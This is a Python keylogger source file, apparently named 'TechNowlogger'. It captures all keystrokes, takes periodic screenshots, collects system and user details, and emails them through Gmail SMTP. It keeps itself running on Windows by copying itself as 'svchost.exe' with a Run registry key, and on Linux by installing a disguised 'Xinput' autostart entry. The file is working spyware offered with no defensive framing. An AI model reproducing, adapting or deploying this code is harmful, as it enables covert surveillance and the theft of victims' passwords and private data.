#!/usr/bin/env python
import pynput.keyboard
import threading 
import smtplib
import os
import shutil
import subprocess
import sys
import stat
import platform
import getpass 
import time 
import tempfile
from mss import mss
# 15 to 18 lines for "send_mail_with_attachment()" function
#==============================================================
from email.mime.text import MIMEText              
from email.mime.multipart import MIMEMultipart  
from email.mime.application import MIMEApplication 
from os.path import basename    
#==============================================================


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.temp_screenshot = tempfile.gettempdir() + "\\screenshot.png"
        self.system_info = self.get_system_info()

    def append_to_log(self, string):
        self.log = self.log + string

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):        
        self.send_mail(self.log)
        self.log = ""
        self.take_screenshot()
        self.send_mail_with_attachment(files= [self.temp_screenshot])
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def take_screenshot(self):
        try:
            os.remove('screenshot.png')
        except Exception as e:
            pass
        temp_dir = tempfile.gettempdir()
        os.chdir(temp_dir)
        with mss() as screenshot:
            screenshot.shot(output="screenshot.png")

    def send_mail(self, message):
        try:
            message = "Subject: TechnowLogger Reporting\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
        except Exception as e:
            time.sleep(15)
            self.send_mail(self.log)

    def send_mail_with_attachment(self, files= None):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email  
            msg['Subject'] = "TechnowLogger Reporting With Screenshot Attachments"
            text = "\nReport From:\n\n" + self.system_info 
            msg.attach(MIMEText(text))

            for f in files or []:
                with open(f, "rb") as fil: 
                    ext = f.split('.')[-1:]
                    attachedfile = MIMEApplication(fil.read(), _subtype = ext)
                    attachedfile.add_header(
                        'content-disposition', 'attachment', filename=basename(f) )
                msg.attach(attachedfile)

            smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
            smtp.starttls()
            smtp.login(self.email, self.password)
            smtp.sendmail(self.email, self.email, msg.as_string())
            smtp.close()
        except Exception as e:
            time.sleep(15)
            self.take_screenshot()            
            self.send_mail_with_attachment(files= [self.temp_screenshot])

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def become_persistent(self, time_persistent):
        if sys.platform.startswith("win"):
            self.become_persistent_on_windows(time_persistent)
        elif sys.platform.startswith("linux"):
            self.become_persistent_on_linux(time_persistent)

    def become_persistent_on_windows(self, time_persistent):
        evil_file_location = os.environ["appdata"] + "\\svchost.exe"
        if not os.path.exists(evil_file_location):
            time.sleep(time_persistent)
            self.log = "** TechNowlogger started on Windows System ** "
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svchost /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def become_persistent_on_linux(self, time_persistent):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            time.sleep(time_persistent)
            self.log = "** TechNowlogger started On Linux System **"
            try:
                os.makedirs(autostart_path)
            except OSError:
                pass

            destination_file = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, destination_file)
            self.chmod_to_exec(destination_file)

            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + destination_file + "\n")

            self.chmod_to_exec(autostart_file)
            subprocess.Popen(destination_file)
            sys.exit()

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)